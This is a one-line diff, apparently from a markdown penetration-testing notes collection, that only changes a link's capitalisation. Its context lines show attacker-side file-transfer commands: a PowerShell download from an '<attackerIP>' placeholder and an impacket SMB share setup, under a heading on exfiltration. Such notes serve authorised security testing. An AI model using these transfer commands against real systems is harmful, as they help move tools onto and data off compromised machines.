@@ -41,7 +41,7 @@ Invoke-WebRequest -Uri "http://<attackerIP>:<portno>/FileToTransfer" -OutFile <o
 impacket-smbserver -smb2support -username <user to auth> -password <password to auth> <share name> <share location> # Open an SMB share serving <share location> as <share name>
 ```
 
-Here you can use File Explorer or [[net]] on Windows to map the drive and [[SMBClient]] on Linux. 
+Here you can use File Explorer or [[net]] on Windows to map the drive and [[Smbclient]] on Linux. 
 
 # Exfiltration
 ## Raw TCP Sockets
